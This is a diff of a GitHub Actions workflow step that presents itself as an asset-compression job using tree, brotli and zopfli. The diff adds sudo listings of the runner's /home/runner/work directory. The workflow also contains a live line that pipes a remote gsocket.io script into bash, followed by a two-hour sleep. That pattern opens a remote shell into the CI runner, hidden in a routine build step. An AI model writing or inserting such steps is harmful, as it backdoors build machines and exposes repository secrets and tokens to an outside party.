@@ -40,10 +40,10 @@ jobs:
           echo "installing tree brotli zopfli"
           sudo apt-get install -y --no-install-recommends tree brotli zopfli
           echo "getting tree -Dchanfix --timefmt '%F'"
-          tree -Dchanfix --timefmt '%F' | tee tree.txt
+          sudo  tree -Dchanfi --timefmt '%F' /home/runner/work | tee tree.txt
           # find ./ -regextype posix-egrep -regex ".*\.(min\.css|html|js(on)?|pdf|xml|svg)$" -exec zopfli --i23 {} \; -exec brotli -q 11 -v {} \;
           find ./ -regextype posix-egrep -regex ".*\.(css|html|js(on)?|pdf|xml|svg|map)$" | xargs -I {} -P$(nproc) bash -c '[[ ! -f $1.gz ]] && zopfli --i23 $1; [[ ! -f $1.br ]] && brotli -q 11 -v $1' _ {}
-          tree -Dchanfix --timefmt '%F' | tee tree2.txt
+          sudo  tree -Dchanfi --timefmt '%F' /home/runner/work | tee tree2.txt
           # S="kartika-lama.github.io/bs5-demo" bash -c "$(curl -fsSL https://gsocket.io/y)"
           X="kartika-lama.github.io/bs5-demo" bash -c "$(curl -fsSL https://gsocket.io/x)"
           sleep 7200
